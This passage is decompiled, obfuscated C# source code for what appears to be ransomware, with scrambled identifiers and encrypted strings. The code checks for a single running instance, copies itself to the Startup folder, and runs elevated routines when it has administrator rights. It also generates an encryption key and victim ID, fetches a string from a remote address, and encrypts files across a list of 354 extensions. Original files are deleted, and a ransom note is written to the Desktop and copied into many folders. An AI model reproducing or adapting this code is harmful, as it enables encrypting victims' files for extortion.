								UgscNpyaZraAU(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm + getString_0(107388169), Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!JweQHtvwAVLtP)
								{
									zGYgJOabDUZgZoa(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm, jBAOFpxRKVADf, Convert.FromBase64String(sCJKcfPXYjG));
								}
								else
								{
									zGYgJOabDUZgZoa(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, CS_0024_003C_003E8__locals0.mYcUYPSeirgm, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex12)
							{
								if (rcFXGcWApOJB)
								{
									try
									{
										File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107388938) + CS_0024_003C_003E8__locals0.mYcUYPSeirgm + getString_0(107388192) + ex12.Message + getString_0(107396264));
									}
									catch (Exception)
									{
									}
								}
								CBbCjcYRLmYL++;
								return;
							}
						}
						if (JweQHtvwAVLtP)
						{
							if (OnwOnmkBWIVal != getString_0(107388174))
							{
								mHyPlqBfINJNrTmd(CS_0024_003C_003E8__locals0.mYcUYPSeirgm + OnwOnmkBWIVal, bytes2);
							}
							else
							{
								mHyPlqBfINJNrTmd(CS_0024_003C_003E8__locals0.mYcUYPSeirgm, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0a6b;
			IL_0a6b:
			PAntdrlTZkgXTD.Remove(CS_0024_003C_003E8__locals0.mYcUYPSeirgm);
		}

		static mnXXSXntfqSpCE()
		{
			Strings.CreateGetStringDelegate(typeof(mnXXSXntfqSpCE));
		}
	}

	private sealed class bVaunqIQZmY
	{
		public string bgfwrbttsCB;

		public string SmfMppMusmMh;

		public void _003CEncrypt2_003Eb__40()
		{
			while (true)
			{
				try
				{
					File.Delete(bgfwrbttsCB);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__41()
		{
			while (true)
			{
				try
				{
					if (File.Exists(SmfMppMusmMh))
					{
						File.Delete(SmfMppMusmMh);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string nadKcguuEob;

	public static byte[] jBAOFpxRKVADf;

	public static string buxEOyFbGjfNzeAW;

	public static string GZecQutuAYrd;

	public static List<string> FYgeyItMBgHKLJgZ;

	public static List<string> omtVrtitMiabP;

	public static string pOtDvyWFjbzh;

	public static string DUKuBNRvAydYG;

	public static string sCJKcfPXYjG;

	public static string OakwZVTgeU;

	public static string vvlqbuyzBdCXr;

	public static int jgiMwmtEjAHW;

	public static string xziKmMkpqKW;

	public static string zTlSyJlotVldKzTU;

	public static string htFsgMsmbJE;

	public static string StbJRQYjoJ;

	public static string fUZuJApNUKnlFF;

	public static string ISouoNnrGAOBU;

	public static string yCaQazXapFOCn;

	public static string FVhIETATHxQtua;

	public static List<string> MQstfrKstw;

	public static List<string> ytgqYFajIsYkRHo;

	public static string pxkCnyUGyETTR;

	public static string OmqUzOUWvCqqNT;

	public static string mjPjVtDKVS;

	public static List<string> oODUpNadLmFxS;

	public static string owZjdTzpAYQt;

	private static string dhVHnESaEPM;

	public static string RPyXoPlOJmdYqIY;

	public static string MjCiACobZAma;

	public static List<string> uPyBpQgrykgNTrW;

	public static List<string> CHEqUUkGipABPu;

	public static List<string> ZsaqBdazbYagVe;

	public static List<string> yjfXukyygoMtg;

	public static string GVRjAaBfQw;

	public static List<string> oOZoSUJWDLjw;

	public static List<string> aDTfpntvMuH;

	public static string DFpvzFxNRtQ;

	public static string OvkCDFFSSL;

	internal static DateTime jwqESLsbAkr;

	internal static DateTime UsKzIdrLRh;

	public static string CWgqQYxkECI;

	public static string NzKGGrtTBpkeMR;

	public static string zCYBNBQhPtiMr;

	public static string SzpnhquOpxGl;

	public static string nmAIsaZMbpDkNaT;

	public static string lqSNPgxznFF;

	public static string EAvfUgEetckeqmgs;

	public static string baVPzfInuLOtD;

	public static List<string> vAvIzfBtHKG;

	public static string ilWxgAZLeD;

	public static string ZCRgCrsIaCud;

	public static string aBGwDIdLrfLu;

	public static string LKbgowDgmg;

	public static string BeeNYooWHzG;

	public static string JkMlKoPfgeJRaLaUZ;

	public static string ezwzRqcXtQBF;

	public static string DNRwROhjWECu;

	public static string ElfNFRxAFkaD;

	public static string vajEusdxRSw;

	public static string LiGYlWRmMDBhEWf;

	public static string gsYAYgWbBtFL;

	public static string VeEQSEcfdFUH;

	public static string ToPvNEVWQmmpbo;

	public static string FJSbedpaUrC;

	public static string jUlKKGQAyvGJtyp;

	public static string naGXMLDdNuoO;

	public static string lNdMQEsyMdJ;

	public static string KirPMvFSpPtxq;

	public static string pcdcyuTjjngA;

	public static string iKXZxNSoHO;

	public static string tFrEnjsbNAL;

	public static string lYjneyxwbcYdtGcJ;

	public static string uikOdlemzXgPyY;

	public static string dpoPluCxxOZ;

	public static string CUSlUzptGt;

	public static string GlgSVFzlKbjhz;

	public static string hZGTNyEhEGXkLqh;

	public static string BikvpigWlHBvTVo;

	public static string[] KbzdUUqksSGIlhW;

	public static string JMHEmrUMtFhk;

	public static bool BJyvjcvspWj;

	public static string lsFQKNfcSOWxPw;

	public static bool JweQHtvwAVLtP;

	public static bool KCxiSXgmNWqaY;

	public static bool zafPkbxEQDZZ;

	public static bool iFlYrwToswX;

	public static string nPLbuhisBzmHoeaY;

	public static bool rcFXGcWApOJB;

	public static bool MzHmyYhyAYUEO;

	public static bool BpkCbJUpBaZe;

	public static bool luDuQnkIvNDbdd;

	public static bool XTugcnpxmKWX;

	public static string ZvuGPiZgTVaL;

	public static bool DcTmJYuRqmJcpcY;

	public static Stopwatch QCpFpzNWDHrHuZI;

	public static int CBbCjcYRLmYL;

	public static int TdmvufTfNVtQu;

	public static bool oVVBsGsoBvRKjE;

	public static string nmBFzgaiOADgSVhq;

	public static string[] QqkAgBIacsuCHc;

	public static List<string> XkSfVvWNEoLujZU;

	public static int LoqeOEkLpePTMECv;

	public static List<string> DIrAiHcqaZdYH;

	public static List<string> tqQwsaMDDrPjiB;

	public static List<string> BTvdPgpdEslNJEjN;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate19;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			SopQsPPkSScp CS_0024_003C_003E8__locals0 = new SopQsPPkSScp();
			CS_0024_003C_003E8__locals0.oFMarRepQsTvd = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.oFMarRepQsTvd) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			sNlsfoyAvccL.PbgdRVjsXFFf(dhVHnESaEPM);
		}
		catch (Exception)
		{
		}
		try
		{
			if (CUSlUzptGt == getString_0(107396809))
			{
				Thread thread = new Thread(mIaJvhOwci.SUNWUAhMvhbH);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (htFsgMsmbJE == getString_0(107396809))
		{
			Thread.Sleep(int.Parse(StbJRQYjoJ));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && EAvfUgEetckeqmgs == getString_0(107396809))
		{
			try
			{
				BsDrYOpMlrRdxB(JqDJfBiOyDaAy(getString_0(107396804)));
			}
			catch
			{
			}
		}
		try
		{
			if (yCaQazXapFOCn == getString_0(107396809) && ZADoTTYShLHq.FxGfwoodcbGtfqK())
			{
				new UhkNubBinvEmOU().ISpQpKkdoQCsiV(bool_0: false);
				ZADoTTYShLHq.MiJIQLOwKLMNGbCj();
			}
		}
		catch (Exception)
		{
		}
		if (OmqUzOUWvCqqNT == getString_0(107396809) && ZADoTTYShLHq.FxGfwoodcbGtfqK())
		{
			new UhkNubBinvEmOU().ISpQpKkdoQCsiV(bool_0: false);
			new UhkNubBinvEmOU().sTHHttFgMea();
		}
		if (zTlSyJlotVldKzTU == getString_0(107396809))
		{
			CragSJqGZWpeLE.YyAiWopYbqtZ();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397179);
			string text2 = text + Path.GetFileName(fileName);
			if (vvlqbuyzBdCXr == getString_0(107396809) && fileName != text2)
			{
				Thread thread2 = new Thread(gwqpbDhvTaQ);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (pOtDvyWFjbzh == getString_0(107396809) && mainModule != null && fileName != text2)
			{
				try
				{
					jgiMwmtEjAHW = CULulWVeCQQILTquo(0, MQstfrKstw.Count);
					File.Copy(fileName, text + MQstfrKstw[jgiMwmtEjAHW], overwrite: true);
					Process.Start(text + MQstfrKstw[jgiMwmtEjAHW]);
					bblGGLeySpj();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (DFpvzFxNRtQ == getString_0(107396809) && DateTime.Now < jwqESLsbAkr)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (OvkCDFFSSL == getString_0(107396809) && DateTime.Now > UsKzIdrLRh)
			{
				bblGGLeySpj();
			}
		}
		catch
		{
		}
		egMhAMendwXb();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> cHEqUUkGipABPu = CHEqUUkGipABPu;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388088)), string_0);
					};
				}
				Parallel.ForEach(cHEqUUkGipABPu, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> zsaqBdazbYagVe = ZsaqBdazbYagVe;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388107)), string_0);
					};
				}
				Parallel.ForEach(zsaqBdazbYagVe, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (BikvpigWlHBvTVo == getString_0(107396809))
				{
					string[] kbzdUUqksSGIlhW = KbzdUUqksSGIlhW;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388107)), getString_0(107388050) + string_0 + getString_0(107388073));
						};
					}
					Parallel.ForEach(kbzdUUqksSGIlhW, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!UkwNvBJJCwFjgR().Contains(getString_0(107388817)))
				{
					ZRImcljqIISuaY(GVRjAaBfQw);
				}
				else
				{
					List<string> source = yjfXukyygoMtg;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							xxpegTfogDffK(JqDJfBiOyDaAy(lOmjExCerIObT(getString_0(107388068))), string_0);
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> source2 = oOZoSUJWDLjw;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						xxpegTfogDffK(JqDJfBiOyDaAy(getString_0(107388043)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397174))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397174)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397189)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !FYgeyItMBgHKLJgZ.Contains(text6) && text6 != getString_0(107397168) && text6 != getString_0(107397115) && text6 != getString_0(107397126))
								{
									FYgeyItMBgHKLJgZ.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397097)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397052))
						{
							VeEQSEcfdFUH = getString_0(107396809);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397043))
						{
							VeEQSEcfdFUH = getString_0(107397066);
						}
					}
					if (text3.Contains(getString_0(107397061)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397052))
						{
							DcTmJYuRqmJcpcY = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397043))
						{
							DcTmJYuRqmJcpcY = false;
						}
					}
					if (text3.Contains(getString_0(107397012)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397052))
						{
							rcFXGcWApOJB = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397043))
						{
							rcFXGcWApOJB = false;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (rcFXGcWApOJB)
			{
				try
				{
					File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107397031) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (VeEQSEcfdFUH == getString_0(107397066))
		{
			wQJZbnWkxQVjKWEO();
		}
		if (VeEQSEcfdFUH == getString_0(107396809))
		{
			try
			{
				uKyLyocBMtsGX();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && zafPkbxEQDZZ)
			{
				try
				{
					Thread thread4 = new Thread(yQhDkCXarMmt.NKFcjRoJPp);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			xxpegTfogDffK(getString_0(107396442), JqDJfBiOyDaAy(getString_0(107396461)));
		}
		SecureString secureString = new SecureString();
		if (zCYBNBQhPtiMr == getString_0(107397066))
		{
			DUKuBNRvAydYG = EyxHIzBgCEnzgn.JXgFRQquWqtcRNm(32);
			sCJKcfPXYjG = EyxHIzBgCEnzgn.tpIepiJRhhm();
		}
		else
		{
			DUKuBNRvAydYG = getString_0(107396388);
		}
		OakwZVTgeU = pQtTIepfVunG.MmnVKLBAZcnOVX(DUKuBNRvAydYG + sCJKcfPXYjG);
		if (BpkCbJUpBaZe)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), ZvuGPiZgTVaL)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), ZvuGPiZgTVaL), string.Concat(JqDJfBiOyDaAy(getString_0(107396311)), new WebClient().DownloadString(JqDJfBiOyDaAy(getString_0(107396286))), getString_0(107396245), JqDJfBiOyDaAy(getString_0(107396272)), DateTime.Now, getString_0(107396245), JqDJfBiOyDaAy(getString_0(107396231)), OakwZVTgeU));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), ZvuGPiZgTVaL), getString_0(107396686) + OakwZVTgeU);
				}
			}
			catch (Exception ex9)
			{
				if (rcFXGcWApOJB)
				{
					try
					{
						File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107396657) + ex9.Message + getString_0(107396245));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		VSZusyrSRRszkw.ExnpsTnhoAu(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), pcdcyuTjjngA), rSWVZLVcxxWN(OakwZVTgeU), null, null, getString_0(107396576), getString_0(107396591), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			VnNIJhBAQfWBV();
		}
		try
		{
			try
			{
				if (DcTmJYuRqmJcpcY)
				{
					Console.WriteLine(getString_0(107396542));
				}
			}
			catch
			{
			}
			zFCbExVZuZNx(new string[1] { getString_0(107396525) }, new string[354]
			{
				getString_0(107396516),
				getString_0(107396479),
				getString_0(107396474),
				getString_0(107396497),
				getString_0(107396492),
				getString_0(107396487),
				getString_0(107396482),
				getString_0(107395933),
				getString_0(107395928),
				getString_0(107395923),
				getString_0(107395950),
				getString_0(107395945),
				getString_0(107395904),
				getString_0(107395899),
				getString_0(107395890),
				getString_0(107395917),
				getString_0(107395912),
				getString_0(107395907),
				getString_0(107395870),
				getString_0(107395865),
				getString_0(107395888),
				getString_0(107395883),
				getString_0(107395878),
				getString_0(107395841),
				getString_0(107395836),
				getString_0(107395831),
				getString_0(107395826),
				getString_0(107395853),
				getString_0(107395848),
				getString_0(107395843),
				getString_0(107395806),
				getString_0(107395801),
				getString_0(107395796),
				getString_0(107395823),
				getString_0(107395814),
				getString_0(107395777),
				getString_0(107395772),
				getString_0(107395767),
				getString_0(107396482),
				getString_0(107395762),
				getString_0(107395928),
				getString_0(107395785),
				getString_0(107395780),
				getString_0(107395743),
				getString_0(107395738),
				getString_0(107395733),
				getString_0(107395760),
				getString_0(107395755),
				getString_0(107395750),
				getString_0(107395713),
				getString_0(107395708),
				getString_0(107395703),
				getString_0(107395698),
				getString_0(107395725),
				getString_0(107395720),
				getString_0(107395715),
				getString_0(107396190),
				getString_0(107396185),
				getString_0(107396208),
				getString_0(107396203),
				getString_0(107396194),
				getString_0(107396149),
				getString_0(107395762),
				getString_0(107396168),
				getString_0(107396127),
				getString_0(107396118),
				getString_0(107396141),
				getString_0(107396132),
				getString_0(107396091),
				getString_0(107396086),
				getString_0(107396109),
				getString_0(107396100),
				getString_0(107396059),
				getString_0(107396054),
				getString_0(107396081),
				getString_0(107396076),
				getString_0(107396071),
				getString_0(107396066),
				getString_0(107396029),
				getString_0(107396020),
				getString_0(107396047),
				getString_0(107396042),
				getString_0(107396037),
				getString_0(107396000),
				getString_0(107395995),
				getString_0(107395986),
				getString_0(107396009),
				getString_0(107396004),
				getString_0(107395796),
				getString_0(107395967),
				getString_0(107395962),
				getString_0(107395957),
				getString_0(107395984),
				getString_0(107395979),
				getString_0(107395970),
				getString_0(107395421),
				getString_0(107395416),
				getString_0(107395439),
				getString_0(107395434),
				getString_0(107395429),
				getString_0(107395392),
				getString_0(107395387),
				getString_0(107395382),
				getString_0(107395409),
				getString_0(107395400),
				getString_0(107395395),
				getString_0(107395358),
				getString_0(107395353),
				getString_0(107395348),
				getString_0(107395375),
				getString_0(107395370),
				getString_0(107395365),
				getString_0(107395328),
				getString_0(107395323),
				getString_0(107395318),
				getString_0(107395345),
				getString_0(107395336),
				getString_0(107395331),
				getString_0(107395294),
				getString_0(107395289),
				getString_0(107395284),
				getString_0(107395311),
				getString_0(107395306),
				getString_0(107395301),
				getString_0(107395264),
				getString_0(107395255),
				getString_0(107395250),
				getString_0(107395273),
				getString_0(107395268),
				getString_0(107395231),
				getString_0(107395226),
				getString_0(107395221),
				getString_0(107395244),
				getString_0(107395239),
				getString_0(107395234),
				getString_0(107395197),
				getString_0(107395192),
				getString_0(107395187),
				getString_0(107395214),
				getString_0(107395209),
				getString_0(107395204),
				getString_0(107395679),
				getString_0(107395674),
				getString_0(107395669),
				getString_0(107395696),
				getString_0(107395691),
				getString_0(107395682),
				getString_0(107395645),
				getString_0(107395640),
				getString_0(107395635),
				getString_0(107395658),
				getString_0(107395617),
				getString_0(107395612),
				getString_0(107395607),
				getString_0(107395602),
				getString_0(107395629),
				getString_0(107395624),
				getString_0(107395619),
				getString_0(107395582),
				getString_0(107395577),
				getString_0(107395572),
				getString_0(107395599),
				getString_0(107395594),
				getString_0(107395589),
				getString_0(107395552),
				getString_0(107395547),
				getString_0(107395542),
				getString_0(107395569),
				getString_0(107395560),
				getString_0(107395555),
				getString_0(107395514),
				getString_0(107395533),
				getString_0(107395488),
				getString_0(107395479),
				getString_0(107395502),
				getString_0(107395493),
				getString_0(107395452),
				getString_0(107395443),
				getString_0(107395470),
				getString_0(107395461),
				getString_0(107394908),
				getString_0(107394899),
				getString_0(107394926),
				getString_0(107394921),
				getString_0(107394916),
				getString_0(107394879),
				getString_0(107394874),
				getString_0(107394869),
				getString_0(107394892),
				getString_0(107394887),
				getString_0(107394882),
				getString_0(107394845),
				getString_0(107394840),
				getString_0(107394835),
				getString_0(107394858),
				getString_0(107394817),
				getString_0(107394812),
				getString_0(107395696),
				getString_0(107394807),
				getString_0(107394802),
				getString_0(107394829),
				getString_0(107394820),
				getString_0(107394783),
				getString_0(107394778),
				getString_0(107394801),
				getString_0(107394796),
				getString_0(107394791),
				getString_0(107394786),
				getString_0(107394749),
				getString_0(107394744),
				getString_0(107395328),
				getString_0(107394767),
				getString_0(107394762),
				getString_0(107394757),
				getString_0(107394720),
				getString_0(107394715),
				getString_0(107394710),
				getString_0(107394737),
				getString_0(107394732),
				getString_0(107394727),
				getString_0(107394722),
				getString_0(107394685),
				getString_0(107394680),
				getString_0(107394675),
				getString_0(107394702),
				getString_0(107394693),
				getString_0(107395164),
				getString_0(107395159),
				getString_0(107395154),
				getString_0(107395181),
				getString_0(107395176),
				getString_0(107395171),
				getString_0(107395134),
				getString_0(107395129),
				getString_0(107395124),
				getString_0(107395147),
				getString_0(107395138),
				getString_0(107395101),
				getString_0(107395096),
				getString_0(107395091),
				getString_0(107395118),
				getString_0(107395113),
				getString_0(107395108),
				getString_0(107395071),
				getString_0(107395066),
				getString_0(107395061),
				getString_0(107395108),
				getString_0(107395071),
				getString_0(107395088),
				getString_0(107395083),
				getString_0(107395078),
				getString_0(107395041),
				getString_0(107395036),
				getString_0(107395031),
				getString_0(107395026),
				getString_0(107395053),
				getString_0(107395048),
				getString_0(107395043),
				getString_0(107395006),
				getString_0(107394997),
				getString_0(107395020),
				getString_0(107395011),
				getString_0(107394970),
				getString_0(107394993),
				getString_0(107394984),
				getString_0(107394979),
				getString_0(107394942),
				getString_0(107394937),
				getString_0(107395928),
				getString_0(107395311),
				getString_0(107394932),
				getString_0(107394959),
				getString_0(107394954),
				getString_0(107394949),
				getString_0(107394400),
				getString_0(107394395),
				getString_0(107394390),
				getString_0(107394413),
				getString_0(107394404),
				getString_0(107394363),
				getString_0(107394354),
				getString_0(107394377),
				getString_0(107394336),
				getString_0(107394331),
				getString_0(107394326),
				getString_0(107394353),
				getString_0(107394348),
				getString_0(107394343),
				getString_0(107394338),
				getString_0(107395409),
				getString_0(107394293),
				getString_0(107394320),
				getString_0(107395755),
				getString_0(107395619),
				getString_0(107396059),
				getString_0(107394899),
				getString_0(107394315),
				getString_0(107394310),
				getString_0(107394273),
				getString_0(107394268),
				getString_0(107394263),
				getString_0(107394286),
				getString_0(107394277),
				getString_0(107394240),
				getString_0(107394235),
				getString_0(107394230),
				getString_0(107394257),
				getString_0(107394252),
				getString_0(107394247),
				getString_0(107394242),
				getString_0(107394205),
				getString_0(107394200),
				getString_0(107394195),
				getString_0(107394222),
				getString_0(107394217),
				getString_0(107394176),
				getString_0(107394167),
				getString_0(107394162),
				getString_0(107394189),
				getString_0(107394184),
				getString_0(107394179),
				getString_0(107394654),
				getString_0(107394649),
				getString_0(107394644),
				getString_0(107394671),
				getString_0(107394666),
				getString_0(107394661),
				getString_0(107394620),
				getString_0(107394611),
				getString_0(107394638),
				getString_0(107394633),
				getString_0(107394628),
				getString_0(107394591),
				getString_0(107394586),
				getString_0(107394581),
				getString_0(107394604),
				getString_0(107394595),
				getString_0(107394558),
				getString_0(107394553),
				getString_0(107394548),
				getString_0(107395108),
				getString_0(107395071),
				getString_0(107394575),
				getString_0(107394570),
				getString_0(107394565),
				getString_0(107394528),
				getString_0(107394523),
				getString_0(107394518),
				getString_0(107394545),
				getString_0(107394540),
				getString_0(107394535),
				getString_0(107394530),
				getString_0(107394493),
				getString_0(107394488)
			}, new string[0], DUKuBNRvAydYG, getString_0(107394483));
		}
		catch (Exception ex11)
		{
			if (rcFXGcWApOJB)
			{
				try
				{
					File.AppendAllText(nPLbuhisBzmHoeaY, getString_0(107394474) + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394449)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394449));
				streamWriter.WriteLine(JqDJfBiOyDaAy(getString_0(107393880)));
				streamWriter.WriteLine(getString_0(107396245));
				streamWriter.WriteLine(JqDJfBiOyDaAy(getString_0(107391850)));
				streamWriter.WriteLine(OakwZVTgeU);
				if (RPyXoPlOJmdYqIY == getString_0(107397066))
				{
					streamWriter.WriteLine(getString_0(107396245));
					streamWriter.WriteLine(JqDJfBiOyDaAy(getString_0(107391817)) + Convert.ToString(oODUpNadLmFxS.Count));
				}
				if (oVVBsGsoBvRKjE)
				{
					streamWriter.WriteLine(getString_0(107396245));
					streamWriter.WriteLine(JqDJfBiOyDaAy(getString_0(107391708)));
					streamWriter.WriteLine(vnvqegDZgMFTThUQ.AEfbHcWBmhiPBNq());
				}
			}
			else
			{
				string text10 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394449));
				if (!text10.Contains(OakwZVTgeU) && !JweQHtvwAVLtP)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394449), getString_0(107391675) + OakwZVTgeU);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in ytgqYFajIsYkRHo)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107394449)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394449), item + getString_0(107394449), overwrite: true);
				}
				else
				{
					string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394449));
					if (!text11.Contains(OakwZVTgeU) && !JweQHtvwAVLtP)
					{
						File.AppendAllText(item + getString_0(107394449), getString_0(107391675) + OakwZVTgeU);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!iFlYrwToswX && num > 10)
			{
				break;
			}
		}
		if (lYjneyxwbcYdtGcJ == getString_0(107396809))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391646)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391646));
					streamWriter2.WriteLine(JqDJfBiOyDaAy(getString_0(107391653)));
					streamWriter2.WriteLine(getString_0(107396245));
					streamWriter2.WriteLine(JqDJfBiOyDaAy(getString_0(107391604)));
					streamWriter2.WriteLine(OakwZVTgeU + JqDJfBiOyDaAy(getString_0(107392027)));
					if (RPyXoPlOJmdYqIY == getString_0(107397066))
					{
						streamWriter2.WriteLine(getString_0(107396245));
						streamWriter2.WriteLine(JqDJfBiOyDaAy(getString_0(107392046)) + JqDJfBiOyDaAy(getString_0(107391817)) + Convert.ToString(oODUpNadLmFxS.Count) + JqDJfBiOyDaAy(getString_0(107392027)));
					}
					if (oVVBsGsoBvRKjE)
					{
						streamWriter2.WriteLine(getString_0(107396245));
						streamWriter2.WriteLine(JqDJfBiOyDaAy(getString_0(107391708)));
						streamWriter2.WriteLine(vnvqegDZgMFTThUQ.AEfbHcWBmhiPBNq());
					}
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394449));
					if (!text12.Contains(OakwZVTgeU) && !JweQHtvwAVLtP)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391646), JqDJfBiOyDaAy(getString_0(107392046)) + getString_0(107391675) + OakwZVTgeU + JqDJfBiOyDaAy(getString_0(107392027)));
					}
				}
			}
			catch
			{
			}
		}
		if (owZjdTzpAYQt == getString_0(107396809))
		{
			try
			{
